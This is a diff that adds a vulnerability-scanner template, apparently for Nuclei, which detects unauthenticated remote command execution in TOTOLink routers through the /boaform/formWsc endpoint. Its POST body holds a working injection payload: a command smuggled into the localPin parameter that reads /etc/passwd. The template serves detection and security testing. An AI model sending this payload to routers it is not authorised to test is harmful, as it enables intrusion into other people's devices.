@@ -1,0 +1,27 @@
+id: totolink-boaform-rce
+brief:
+    title: TOTOLink Router - Remote Command Execution
+    by: ritikchaddha
+    level: critical
+    about: TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.
+    label:
+        - totolink
+        - rce
+        - router
+        - boaform
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/boaform/formWsc'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
+      signs:
+        - "on": status
+          status:
+            - 200
